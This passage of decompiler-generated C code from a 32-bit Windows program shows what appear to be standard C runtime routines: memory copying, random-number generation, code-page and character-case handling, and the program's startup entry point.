					edi_216.u0 = 0xFF;
				*(fp - 0x18) = (union Eq_4 *) edi_216;
				*(fp - 0x1C) = (union Eq_4 *) ebx_17;
				*(fp - 0x20) = (union Eq_4 *) fp->t000C;
				word32 ebx_227;
				ecx_107 = fn00408977(edi_216, dwArg00, dwArg04, dwArg08, out ebx_227);
				Eq_4 eax_230 = fp->t000C;
				Mem233[edi_216 + eax_230:byte] = Mem226[edi_216 + eax_230:byte] & 0x00;
				eax_119 = fp->t0004;
			}
			ebx_17 = fp->t0008;
l00407982:
			Eq_4 edi_55 = *(fp - 0x08);
			if (edi_55 != 0x00 && edi_55 >= ebx_17)
			{
				if (fp->t0010 != 0x00)
				{
					Eq_4 edi_149 = edi_55 - ebx_17;
					if (edi_149 >= 0xFF)
						edi_149.u0 = 0xFF;
					*(fp - 0x18) = (union Eq_4 *) edi_149;
					*(fp - 0x1C) = (union Eq_4 *) ebx_17;
					*(fp - 0x20) = (union Eq_4 *) fp->t0010;
					word32 ebx_160;
					ecx_107 = fn00408977(edi_149, dwArg00, dwArg04, dwArg08, out ebx_160);
					Eq_4 eax_163 = fp->t0010;
					Mem166[edi_149 + eax_163:byte] = Mem159[edi_149 + eax_163:byte] & 0x00;
					eax_119 = fp->t0004;
				}
				Eq_4 edi_125 = fp->t0014;
				if (edi_125 != 0x00)
				{
					Eq_4816 (* eax_129)[] = eax_119 - *(fp - 0x08);
					if (eax_129 < (Eq_4816 (*)[]) 0xFF)
						esi_114 = eax_129;
					*(fp - 0x18) = (Eq_4816 (**)[]) esi_114;
					*(fp - 0x1C) = *(fp - 0x08);
					*(fp - 0x20) = (union Eq_4 *) edi_125;
					word32 ebx_140;
					ecx_107 = fn00408977(edi_125, dwArg00, dwArg04, dwArg08, out ebx_140);
					Mem145[esi_114 + edi_125:byte] = Mem139[esi_114 + edi_125:byte] & 0x00;
				}
			}
			else
			{
				Eq_4 edi_76 = fp->t0010;
				if (edi_76 != 0x00)
				{
					Eq_4816 (* eax_94)[] = eax_119 - ebx_17;
					if (eax_94 < (Eq_4816 (*)[]) 0xFF)
						esi_114 = eax_94;
					*(fp - 0x18) = (Eq_4816 (**)[]) esi_114;
					*(fp - 0x1C) = (union Eq_4 *) ebx_17;
					*(fp - 0x20) = (union Eq_4 *) edi_76;
					word32 ebx_106;
					ecx_107 = fn00408977(edi_76, dwArg00, dwArg04, dwArg08, out ebx_106);
					Mem111[esi_114 + edi_76:byte] = Mem103[esi_114 + edi_76:byte] & 0x00;
				}
				Eq_4 eax_86 = fp->t0014;
				if (eax_86 != 0x00)
					*eax_86 = *eax_86 & 0x00;
			}
			return ecx_107;
		}
	}
	ecx_107 = fp->t000C;
	if (ecx_107 != 0x00)
		*ecx_107 = *ecx_107 & 0x00;
	goto l00407982;
}

// 00407ACE: Register byte fn00407ACE(Register Eq_4 ecx, Stack word32 dwArg04, Stack byte bArg05, Stack byte bArg06, Register out ptr32 ecxOut)
byte fn00407ACE(Eq_4 ecx, word32 dwArg04, byte bArg05, byte bArg06, ptr32 & ecxOut)
{
	*ecxOut = ecx;
	byte al_109;
	if (globals->t49393C == 0x00)
	{
		al_109 = (byte) dwArg04;
		if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
			al_109 = (byte) (dwArg04 + 0x20);
		return al_109;
	}
	if (dwArg04 < 0x0100)
	{
		ui32 eax_191;
		if (globals->dw412C1C > 0x01)
		{
			eax_191 = fn00408C50(dwArg04, SLICE(dwArg04, word16, 16), 0x01);
			word32 ecx_206;
			*ecxOut = 0x01;
		}
		else
		{
			Eq_11762 eax_208[] = globals->ptr412A10;
			eax_191 = DPB(eax_208, eax_208[dwArg04].t0000, 0) & 0x01;
		}
		if (eax_191 == 0x00)
		{
l00407B2B:
			al_109 = (byte) dwArg04;
			return al_109;
		}
	}
	word32 eax_126;
	if ((globals->ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
		eax_126 = 0x02;
	else
		eax_126 = 0x01;
	word32 ecx_147;
	Eq_4 eax_148 = fn00408A01(fp - 0x04, globals->t49393C, (byte *) 0x0100, 0x01, fp + 0x04, eax_126, fp - 0x08, 0x03, 0x00, 0x01, out ecx_147);
	if (eax_148 != 0x00)
	{
		if (eax_148 == 0x01)
			al_109 = (byte) (word32) bLoc08;
		else
		{
			ui32 ecx_161 = (word32) bLoc08;
			*ecxOut = ecx_161;
			al_109 = (byte) ((word32) bLoc07 << 0x08 | ecx_161);
		}
		return al_109;
	}
	goto l00407B2B;
}

// 00407BEB: Register Eq_4 fn00407BEB(Register Eq_4 ebp, Stack Eq_4 dwArg04, Register out ptr32 ediOut)
Eq_4 fn00407BEB(Eq_4 ebp, Eq_4 dwArg04, ptr32 & ediOut)
{
	Eq_4 ebp_7;
	word32 edi_8;
	fn004095E4(ebp, dwArg04, out ebp_7, out edi_8);
	return ebp_7;
}

// 00407C00: Register word32 fn00407C00(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08, Stack word32 dwArg0C, Register out ptr32 esiOut, Register out Eq_2872 ediOut)
word32 fn00407C00(Eq_4 dwArg04, Eq_4 dwArg08, word32 dwArg0C, ptr32 & esiOut, Eq_2872 & ediOut)
{
	word32 * esi_13 = dwArg08;
	word32 * edi_17 = dwArg04;
	word32 * eax_20 = dwArg08 + dwArg0C;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				word32 esp_85;
				word32 ebp_86;
				word32 edi_87;
				word32 esi_88;
				word32 ecx_89;
				word32 eax_90;
				word32 edx_91;
				byte SCZO_92;
				byte CZ_93;
				byte C_94;
				byte SZO_95;
				byte Z_96;
				byte D_97;
				(*((char *) globals->a407D58 + (dwArg0C - 0x04) * 0x04))();
				return ebp_86;
			}
			else
			{
				word32 esp_72;
				word32 ebp_73;
				word32 edi_74;
				word32 esi_75;
				word32 ecx_76;
				word32 eax_77;
				word32 edx_78;
				byte SCZO_79;
				byte CZ_80;
				byte C_81;
				byte SZO_82;
				byte Z_83;
				byte D_84;
				(*((char *) globals->a407C60 + (dwArg04 & 0x03) * 0x04))();
				return ebp_73;
			}
		}
		else
		{
			uint32 ecx_42 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C & 0x03)
					;
			}
			else
			{
				while (ecx_42 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = esi_13 + 0x01;
					edi_17 = edi_17 + 0x01;
					ecx_42 = ecx_42 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_48;
					*esiOut = esi;
					word32 edi_50;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_100 = dwArg08 + (dwArg0C - 0x04);
		word32 * edi_101 = dwArg04 + (dwArg0C - 0x04);
		if ((edi_101 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_154;
				word32 ebp_155;
				word32 edi_156;
				word32 esi_157;
				word32 ecx_158;
				word32 eax_159;
				word32 edx_160;
				byte SCZO_161;
				byte CZ_162;
				byte C_163;
				byte SZO_164;
				byte Z_165;
				byte D_166;
				(*((char *) globals->a407DE8 + (edi_101 & 0x03) * 0x04))();
				return ebp_155;
			}
		}
		else
		{
			uint32 ecx_117 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_131 = -(dwArg0C >> 0x02);
				word32 esp_134;
				word32 ebp_135;
				word32 edi_136;
				word32 esi_137;
				word32 ecx_138;
				word32 eax_139;
				word32 edx_140;
				byte SCZO_141;
				byte CZ_142;
				byte C_143;
				byte SZO_144;
				byte Z_145;
				byte D_146;
				(*((char *) globals->a407E90 + ecx_131 * 0x04))();
				return ebp_135;
			}
			else
			{
				while (ecx_117 != 0x00)
				{
					*edi_101 = *esi_100;
					esi_100 = esi_100 - 0x04;
					edi_101 = edi_101 - 0x04;
					ecx_117 = ecx_117 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_111;
					*esiOut = esi;
					word32 edi_113;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
}

// 00407F35: void fn00407F35(Stack Eq_23 dwArg04)
void fn00407F35(Eq_23 dwArg04)
{
	globals->dw412900 = dwArg04;
	return;
}

// 00407F3F: Register ui32 fn00407F3F()
ui32 fn00407F3F()
{
	int32 eax_5 = globals->dw412900 *s 0x000343FD + 2531011;
	globals->dw412900 = eax_5;
	return eax_5 >> 0x10 & 0x7FFF;
}

// 00407F60: void fn00407F60(Register uint32 eax, Stack ptr32 dwArg00)
void fn00407F60(uint32 eax, ptr32 dwArg00)
{
	ptr32 ecx_10 = fp + 0x04;
	if (eax >= 0x1000)
	{
		do
		{
			ecx_10 = ecx_10 - 0x1000;
			eax = eax - 0x1000;
		} while (eax >= 0x1000);
	}
	*(ecx_10 - eax - 0x04) = dwArg00;
	return;
}

// 00407F8F: Register word32 fn00407F8F(Stack Eq_4 dwArg04)
word32 fn00407F8F(Eq_4 dwArg04)
{
	return fn00409625(dwArg04);
}

// 00407FE0: Register word32 fn00407FE0(Stack word32 dwArg04, Stack Eq_2 dwArg08, Stack Eq_5202 dwArg0C, Register out Eq_5203 esiOut)
word32 fn00407FE0(word32 dwArg04, Eq_2 dwArg08, Eq_5202 dwArg0C, Eq_5203 & esiOut)
{
	word32 * esi_13 = dwArg08;
	word32 * edi_17 = dwArg04;
	word32 * eax_20 = dwArg08 + dwArg0C;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				word32 esp_84;
				word32 ebp_85;
				word32 edi_86;
				word32 esi_87;
				word32 ecx_88;
				word32 eax_89;
				word32 edx_90;
				byte SCZO_91;
				byte CZ_92;
				byte C_93;
				byte SZO_94;
				byte Z_95;
				byte D_96;
				(*((char *) globals->a408138 + (dwArg0C - 0x04) * 0x04))();
				return ebp_85;
			}
			else
			{
				word32 esp_71;
				word32 ebp_72;
				word32 edi_73;
				word32 esi_74;
				word32 ecx_75;
				word32 eax_76;
				word32 edx_77;
				byte SCZO_78;
				byte CZ_79;
				byte C_80;
				byte SZO_81;
				byte Z_82;
				byte D_83;
				(*((char *) globals->a408040 + (dwArg04 & 0x03) * 0x04))();
				return ebp_72;
			}
		}
		else
		{
			uint32 ecx_41 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C & 0x03)
					;
			}
			else
			{
				while (ecx_41 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = esi_13 + 0x01;
					edi_17 = edi_17 + 0x01;
					ecx_41 = ecx_41 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_47;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_121 = dwArg08 + (dwArg0C - 0x04);
		word32 * edi_100 = dwArg04 + (dwArg0C - 0x04);
		if ((edi_100 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_153;
				word32 ebp_154;
				word32 edi_155;
				word32 esi_156;
				word32 ecx_157;
				word32 eax_158;
				word32 edx_159;
				byte SCZO_160;
				byte CZ_161;
				byte C_162;
				byte SZO_163;
				byte Z_164;
				byte D_165;
				(*((char *) globals->a4081C8 + (edi_100 & 0x03) * 0x04))();
				return ebp_154;
			}
		}
		else
		{
			uint32 ecx_116 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_130 = -(dwArg0C >> 0x02);
				word32 esp_133;
				word32 ebp_134;
				word32 edi_135;
				word32 esi_136;
				word32 ecx_137;
				word32 eax_138;
				word32 edx_139;
				byte SCZO_140;
				byte CZ_141;
				byte C_142;
				byte SZO_143;
				byte Z_144;
				byte D_145;
				(*((char *) globals->a408270 + ecx_130 * 0x04))();
				return ebp_134;
			}
			else
			{
				while (ecx_116 != 0x00)
				{
					*edi_100 = *esi_121;
					esi_121 = esi_121 - 0x04;
					edi_100 = edi_100 - 0x04;
					ecx_116 = ecx_116 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_110;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
}

// 00408420: Register word32 fn00408420(Stack Eq_4 dwArg04, Stack word32 dwArg08, Stack Eq_23 dwArg0C)
word32 fn00408420(Eq_4 dwArg04, word32 dwArg08, Eq_23 dwArg0C)
{
	word32 ecx_16 = dwArg0C;
	if (dwArg0C != 0x00)
	{
		byte * edi_40 = dwArg04;
		if (ecx_16 != 0x00)
		{
			edi_40 = edi_88 + 0x01;
			ecx_16 = ecx_16 - 0x01;
			byte * edi_88 = edi_40;
			if (0x00 == *edi_88)
				goto l00408434;
		}
		word32 ecx_53 = -ecx_16 + dwArg0C;
		byte * edi_55 = dwArg04;
		byte * esi_57 = dwArg08;
		if (ecx_53 != 0x00)
		{
			esi_57 = esi_57 + 0x01;
			edi_55 = edi_55 + 0x01;
			ecx_53 = ecx_53 - 0x01;
			if (*esi_57 != *edi_55)
				goto l0040843F;
		}
		cu8 al_66 = *(esi_57 - 0x01);
		ecx_16 = 0x00;
		if (al_66 > *(edi_55 - 0x01))
		{
l0040844F:
			ecx_16 = ~ecx_16;
			return ecx_16;
		}
		if (al_66 != *(edi_55 - 0x01))
		{
			ecx_16 = ~0x01;
			goto l0040844F;
		}
	}
	return ecx_16;
}

// 00408458: Register Eq_23 Win32CrtStartup()
Eq_23 Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	Eq_23 eax_29 = GetVersion();
	word32 edx_33 = (word32) SLICE(eax_29, byte, 8);
	globals->dw49396C = edx_33;
	globals->dw493968 = eax_29 & 0xFF;
	globals->dw493964 = ((eax_29 & 0xFF) << 0x08) + edx_33;
	globals->dw493960 = eax_29 >> 0x10;
	if (fn0040AACD(0x00) == 0x00)
		fn00408573(fp - 0x04, edi);
	word32 eax_112;
	ui32 ecx_57 = fn0040A922(fp - 0x04, edi);
	globals->t494E68 = GetCommandLineA();
	globals->t493920 = fn0040A7F0(ecx_57);
	ptr32 ebp_63 = fn0040A4EA(fn0040A5A3(ecx_57, fp - 0x04), fp - 0x04);
	word32 esi_64 = fn0040A20C();
	*(ebp_63 - 0x30) = esi_64;
	*(fp - 0x7C) = ebp_63 - 0x5C;
	GetStartupInfoA(*(fp - 0x7C));
	*(ebp_63 - 100) = fn0040A492();
	if ((*(ebp_63 - 0x30) & 0x01) != 0x00)
		eax_112 = (word32) *(ebp_63 - 44);
	else
	{
		*(fp - 0x7C) = 0x0A;
		eax_112 = *(fp - 0x7C);
	}
	*(fp - 0x7C) = eax_112;
	*(fp - 0x80) = *(ebp_63 - 100);
	*(fp - 0x84) = esi_64;
	*(fp - 0x88) = esi_64;
	*(fp - 0x88) = (HMODULE *) GetModuleHandleA(*(fp - 0x88));
	word32 edi_91;
	word32 eax_92 = fn004073E2(ebp_63, out edi_91);
	*(ebp_63 - 0x60) = eax_92;
	*(fp - 0x7C) = eax_92;
	fn0040A239(edi_91, dwArg00);
	word32 ** eax_98 = *(ebp_63 - 0x14);
	word32 ecx_100 = **eax_98;
	*(ebp_63 - 0x68) = ecx_100;
	*(fp - 0x80) = eax_98;
	*(fp - 0x84) = ecx_100;
	return fn0040A30E(dwArg00, dwArg04);
}

// 0040854E: Register word32 fn0040854E(Register Eq_4 ebp, Register Eq_4 edi, Register out (ptr word32) esiOut, Register out (ptr Eq_4719) ediOut)
word32 fn0040854E(Eq_4 ebp, Eq_4 edi, word32 * & esiOut, Eq_4719 * & ediOut)
{
	if (globals->dw493928 == 0x01)
		edi = fn0040ACDC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	word32 ebx_13 = fn0040AD15(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x08) = 0xFF;
	word32 esp_16;
	byte SCZO_17;
	byte Z_18;
	word32 ecx_19;
	word32 ebp_20;
	word32 edi_21;
	word32 ebx_22;
	word32 esi_23;
	globals->ptr412910();
	return ebx_22;
}

// 00408573: void fn00408573(Register Eq_4 ebp, Register Eq_4 edi)
void fn00408573(Eq_4 ebp, Eq_4 edi)
{
	if (globals->dw493928 == 0x01)
		edi = fn0040ACDC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	fn0040AD15(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x04) = 0xFF;
	ExitProcess(*(fp - 0x04));
}

// 00408597: void fn00408597(Stack word32 dwArg04)
void fn00408597(word32 dwArg04)
{
	Eq_251 eax_21 = fn00408730(dwArg04);
	if (eax_21 == globals->t494C38)
		return;
	if (eax_21 != 0x00)
	{
		ui32 edx_111 = 0x00;
		UINT * eax_115 = globals->a412920;
		do
		{
			if (*eax_115 == eax_21)
			{
				word32 ecx_258 = 0x40;
				struct Eq_5752 * edi_260 = globals->a494D60;
				while (ecx_258 != 0x00)
				{
					edi_260->b0000 = (byte) 0x00;
					edi_260 = edi_260 + 0x01;
					ecx_258 = ecx_258 - 0x01;
				}
				edi_260->b0000 = 0x00;
				ui32 esi_266 = edx_111 * 0x03;
				byte * dwLoc08_267 = globals->a412918;
				struct Eq_5893 * ebx_272 = (esi_266 << 0x04) + 0x00412930;
				do
				{
					byte * ecx_285 = &ebx_272->b0000 + 0x01;
					if (ebx_272->b0000 != 0x00)
					{
						do
						{
							byte dl_330 = *ecx_285;
							if (dl_330 == 0x00)
								goto l00408690;
							struct Eq_5922 * eax_335 = (word32) *ecx_285;
							struct Eq_5922 * edi_337 = (word32) dl_330;
							if (eax_335 <= edi_337)
							{
								byte dl_351 = *dwLoc08_267;
								do
								{
									eax_335[0x00494D61] = (struct Eq_5922) (eax_335[0x00494D61] | dl_351);
									eax_335 = eax_335 + 0x01;
								} while (eax_335 <= edi_337);
							}
							struct Eq_5930 * ecx_346 = ecx_285 + 0x01;
							ecx_285 = (byte *) &ecx_346->b0001;
						} while (ecx_346->b0001 != 0x00);
					}
l00408690:
					byte * v22_295 = dwLoc08_267 + 0x01;
					dwLoc08_267 = v22_295;
					ebx_272 = ebx_272 + 0x01;
				} while (v22_295 < (byte *) 4290696940);
				globals->dw494C4C = 0x01;
				globals->t494C38 = eax_21;
				Eq_4 eax_305 = fn0040877A(eax_21);
				struct Eq_5968 * esi_306 = (esi_266 << 0x04) + 0x00412924;
				globals->dw494C40 = esi_306->dw0000;
				globals->dw494C44 = esi_306->dw0004;
				globals->t494E64 = eax_305;
				globals->dw494C48 = esi_306->dw0008;
				goto l0040871F;
			}
			eax_115 = eax_115 + 0x0C;
			edx_111 = edx_111 + 0x01;
		} while (eax_115 < &globals->ptr412A10);
		if (GetCPInfo(eax_21, fp - 0x1C) == 0x01)
		{
			globals->t494C38 = eax_21;
			word32 ecx_144 = 0x40;
			struct Eq_5782 * edi_146 = globals->a494D60;
			while (ecx_144 != 0x00)
			{
				edi_146->b0000 = (byte) 0x00;
				edi_146 = edi_146 + 0x01;
				ecx_144 = ecx_144 - 0x01;
			}
			edi_146->b0000 = 0x00;
			globals->t494E64.u0 = 0x00;
			if (dwLoc1C > 0x01)
			{
				if (bLoc16 != 0x00)
				{
					byte * ecx_213 = fp - 0x15;
					do
					{
						byte dl_220 = *ecx_213;
						if (dl_220 == 0x00)
							goto l004086D6;
						struct Eq_5815 * eax_225 = (word32) *(ecx_213 - 0x01);
						struct Eq_5815 * edx_227 = (word32) dl_220;
						while (eax_225 <= edx_227)
						{
							eax_225[0x00494D61] = (struct Eq_5815) (eax_225[0x00494D61] | 0x04);
							eax_225 = eax_225 + 0x01;
						}
						byte * ecx_242 = ecx_213 + 0x01;
						ecx_213 = ecx_242 + 0x01;
					} while (*ecx_242 != 0x00);
				}
l004086D6:
				struct Eq_5810 * eax_195 = (struct Eq_5810 *) 0x01;
				do
				{
					eax_195[0x00494D61] = (struct Eq_5810) (eax_195[0x00494D61] | 0x08);
					eax_195 = eax_195 + 0x01;
				} while (eax_195 < (struct Eq_5810 *) 0xFF);
				globals->t494E64 = fn0040877A(eax_21);
				globals->dw494C4C = 0x01;
			}
			else
				globals->dw494C4C = 0x00;
			globals->dw494C40 = 0x00;
			globals->dw494C44 = 0x00;
			globals->dw494C48 = 0x00;
l0040871F:
			fn004087D6();
			return;
		}
		if (globals->dw49392C == 0x00)
			return;
	}
	fn004087AD();
	goto l0040871F;
}

// 00408730: Register Eq_251 fn00408730(Stack word32 dwArg04)
UINT fn00408730(word32 dwArg04)
{
	globals->dw49392C = globals->dw49392C & 0x00;
	Eq_251 eax_21 = dwArg04;
	if (dwArg04 != ~0x01)
	{
		if (dwArg04 != ~0x02)
		{
			if (dwArg04 == ~0x03)
			{
				eax_21 = globals->t49394C;
				globals->dw49392C = 0x01;
			}
			return eax_21;
		}
		else
		{
			globals->dw49392C = 0x01;
			return GetACP();
		}
	}
	else
	{
		globals->dw49392C = 0x01;
		return GetOEMCP();
	}
}

// 0040877A: Register word32 fn0040877A(Stack Eq_251 dwArg04)
word32 fn0040877A(UINT dwArg04)
{
	if (dwArg04 == 0x03A4)
		return 0x0411;
	else if (dwArg04 == 0x03A8)
		return 0x0804;
	else if (dwArg04 == 949)
		return 0x0412;
	else if (dwArg04 == 0x03B6)
		return 0x0404;
	else
		return 0x00;
}

// 004087AD: void fn004087AD()
void fn004087AD()
{
	word32 ecx_15 = 0x40;
	struct Eq_6037 * edi_13 = globals->a494D60;
	while (ecx_15 != 0x00)
	{
		edi_13->b0000 = (byte) 0x00;
		edi_13 = edi_13 + 0x01;
		ecx_15 = ecx_15 - 0x01;
	}
	edi_13->b0000 = 0x00;
	globals->t494C38 = 0x00;
	globals->dw494C4C = 0x00;
	globals->t494E64.u0 = 0x00;
	globals->dw494C40 = 0x00;
	globals->dw494C44 = 0x00;
	globals->dw494C48 = 0x00;
	return;
}

// 004087D6: void fn004087D6()
void fn004087D6()
{
	if (GetCPInfo(globals->t494C38, fp - 0x18) == 0x01)
	{
		Eq_6084 eax_65 = 0x00;
		byte al_66 = 0x00;
		do
		{
			*((word32) eax_65 + (fp - 0x0118)) = al_66;
			eax_65 = (word32) eax_65 + 0x01;
			al_66 = (byte) eax_65;
		} while (eax_65 < 0x0100);
		byte al_235 = bLoc12;
		if (bLoc12 != 0x00)
		{
			byte * edx_226 = fp - 0x11;
			do
			{
				Eq_6180 ecx_238 = (word32) *edx_226;
				Eq_6180 eax_240 = (word32) al_235;
				if (eax_240 <= ecx_238)
				{
					uint32 ecx_263 = ecx_238 - eax_240;
					union Eq_6183 * edi_264 = (word32) eax_240 + (fp - 0x0118);
					uint32 ecx_268 = ecx_263 + 0x01 >> 0x02;
					while (ecx_268 != 0x00)
					{
						*edi_264 = 0x20202020;
						edi_264 = (union Eq_6183 *) ((char *) edi_264 + 0x04);
						ecx_268 = ecx_268 - 0x01;
					}
					ui32 ecx_279 = ecx_263 + 0x01 & 0x03;
					while (ecx_279 != 0x00)
					{
						*edi_264 = (union Eq_6183 *) 0x20;
						edi_264 = (union Eq_6183 *) ((char *) edi_264 + 0x01);
						ecx_279 = ecx_279 - 0x01;
					}
				}
				byte * edx_250 = edx_226 + 0x01;
				edx_226 = edx_250 + 0x01;
				al_235 = *edx_250;
			} while (al_235 != 0x00);
		}
		fn0040AE68(fp - 0x04, 0x01, fp - 0x0118, 0x0100, fp - 0x0518, globals->t494C38, globals->t494E64, 0x00);
		word32 ecx_138;
		fn00408A01(fp - 0x04, globals->t494E64, (byte *) 0x0100, 0x01, fp - 0x0118, 0x0100, fp - 0x0218, 0x0100, globals->t494C38, 0x00, out ecx_138);
		word32 ecx_161;
		fn00408A01(fp - 0x04, globals->t494E64, (byte *) 0x0200, 0x02, fp - 0x0118, 0x0100, fp - 0x0318, 0x0100, globals->t494C38, 0x00, out ecx_161);
		struct Eq_6161 * eax_164 = null;
		word16 * ecx_168 = fp - 0x0518;
l004088CC:
		byte dl_196;
		byte dl_178 = (byte) *ecx_168;
		if ((dl_178 & 0x01) != 0x00)
		{
			eax_164[0x00494D61] = (struct Eq_6161) (eax_164[0x00494D61] | 0x10);
			dl_196 = Mem202[fp - 0x0218 + eax_164:byte];
		}
		else
		{
			if ((dl_178 & 0x02) == 0x00)
			{
				eax_164[4803680] = (struct Eq_6161) (eax_164[4803680] & 0x00);
				goto l00408906;
			}
			eax_164[0x00494D61] = (struct Eq_6161) (eax_164[0x00494D61] | 0x20);
			dl_196 = Mem212[fp - 0x0318 + eax_164:byte];
		}
		eax_164[4803680] = (struct Eq_6161) dl_196;
l00408906:
		eax_164 = eax_164 + 0x01;
		ecx_168 = ecx_168 + 0x01;
		if (eax_164 < (struct Eq_6161 *) 0x0100)
			goto l004088CC;
		return;
	}
	struct Eq_6080 * eax_290 = null;
	byte al_291 = 0x00;
l00408916:
	byte cl_342;
	if (eax_290 >= (struct Eq_6080 *) 0x41 && eax_290 <= (struct Eq_6080 *) 0x5A)
	{
		eax_290[0x00494D61] = (struct Eq_6080) (eax_290[0x00494D61] | 0x10);
		cl_342 = al_291 + 0x20;
	}
	else
	{
		if (eax_290 < (struct Eq_6080 *) 0x61 || eax_290 > (struct Eq_6080 *) 122)
		{
			eax_290[4803680] = (struct Eq_6080) (eax_290[4803680] & 0x00);
			goto l00408953;
		}
		eax_290[0x00494D61] = (struct Eq_6080) (eax_290[0x00494D61] | 0x20);
		cl_342 = al_291 - 0x20;
	}
	eax_290[4803680] = (struct Eq_6080) cl_342;
l00408953:
	eax_290 = eax_290 + 0x01;
	al_291 = (byte) eax_290;
	if (eax_290 < (struct Eq_6080 *) 0x0100)
		goto l00408916;
	return;
}

// 0040895B: void fn0040895B()
void fn0040895B()
{
	if (globals->dw494C28 == 0x00)
	{
		fn00408597(~0x02);
		globals->dw494C28 = 0x01;
	}
	return;
}

// 00408977: Register (ptr byte) fn00408977(Register Eq_4 edi, Stack (ptr Eq_4549) dwArg04, Stack Eq_4 dwArg08, Stack (ptr Eq_4549) dwArg0C, Register out ptr32 ebxOut)
byte * fn00408977(Eq_4 edi, Eq_4549 * dwArg04, Eq_4 dwArg08, Eq_4549 * dwArg0C, ptr32 & ebxOut)
{
	*ebxOut = ebx;
	byte * edi_101 = (word32) dwArg04 + 0x01;
	if (globals->dw494C4C == 0x00)
	{
		word32 ebx_45;
		word32 esi_46;
		ecx = fn0040AFC0(dwLoc18, dwArg04, dwArg08, dwArg0C, edi, out ebx_45, out esi_46);
	}
	else
	{
		word32 edx_106 = dwArg0C;
		if (dwArg0C != 0x00)
		{
			ecx = dwArg08 + 0x01;
			do
			{
				byte al_110 = *ecx;
				*edi_101 = al_110;
				edx_106 = edx_106 - 0x01;
				if ((((word32) al_110)->b494D61 & 0x04) != 0x00)
				{
					edi_101 = edi_101;
					ecx = ecx;
					if (edx_106 == 0x00)
					{
						*(edi_101 - 0x01) = *(edi_101 - 0x01) & 0x00;
						break;
					}
					byte al_132 = *ecx;
					*edi_101 = al_132;
					edx_106 = edx_106 - 0x01;
					edi_101 = edi_101 + 0x01;
					ecx = ecx + 0x01;
					if (al_132 == 0x00)
					{
						*(edi_101 - 0x01) = *(edi_101 - 0x01) & 0x00;
						break;
					}
				}
				else
				{
					edi_101 = edi_101 + 0x01;
					ecx = ecx + 0x01;
					if (al_110 == 0x00)
						break;
				}
			} while (edx_106 != 0x00);
		}
		uint32 edx_68 = edx_106 - 0x01;
		if (edx_106 != 0x00)
		{
			uint32 ecx_89 = edx_68 + 0x01 >> 0x02;
			while (ecx_89 != 0x00)
			{
				*edi_101 = (byte) 0x00;
				edi_101 = edi_101 + 0x04;
				ecx_89 = ecx_89 - 0x01;
			}
			ecx = edx_68 + 0x01 & 0x03;
			while (ecx != null)
			{
				*edi_101 = 0x00;
				edi_101 = edi_101 + 0x01;
				ecx = ecx - 0x01;
			}
		}
	}
	return ecx;
}

// 00408A01: Register Eq_4 fn00408A01(Register ptr32 ebp, Stack Eq_4 dwArg04, Stack (ptr byte) dwArg08, Stack byte bArg09, Stack (ptr byte) dwArg0C, Stack word32 dwArg10, Stack ptr32 dwArg14, Stack word32 dwArg18, Stack Eq_251 dwArg1C, Stack word32 dwArg20, Register out ptr32 ecxOut)
Eq_4 fn00408A01(ptr32 ebp, Eq_4 dwArg04, byte * dwArg08, byte bArg09, byte * dwArg0C, word32 dwArg10, ptr32 dwArg14, word32 dwArg18, UINT dwArg1C, word32 dwArg20, ptr32 & ecxOut)
{
	Eq_4 eax_144;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	if (globals->dw493930 == 0x00)
	{
		if (LCMapStringW(0x00, 0x0100, &globals->t40D250, 0x01, null, 0x00) != 0x00)
			globals->dw493930 = 0x01;
		else
		{
			if (LCMapStringA(0x00, 0x0100, 4248140, 0x01, 0x00, 0x00) == 0x00)
				goto l00408B8F;
			globals->dw493930 = 0x02;
		}
	}
	if (dwArg10 > 0x00)
		dwArg10 = fn00408C25(dwArg0C, dwArg10);
	word32 eax_117 = globals->dw493930;
	if (eax_117 == 0x02)
	{
		eax_144 = LCMapStringA(dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18);
		goto l00408B91;
	}
	if (eax_117 == 0x01)
	{
		if (dwArg1C == 0x00)
			dwArg1C = globals->t49394C;
		int32 eax_179 = MultiByteToWideChar(dwArg1C, (0x00 - (-dwArg20 == 0x00) & 0x08) + 0x01, dwArg0C, dwArg10, null, 0x00);
		if (eax_179 == 0x00)
			goto l00408B8F;
		word32 eax_187 = eax_179 * 0x02 + 0x03;
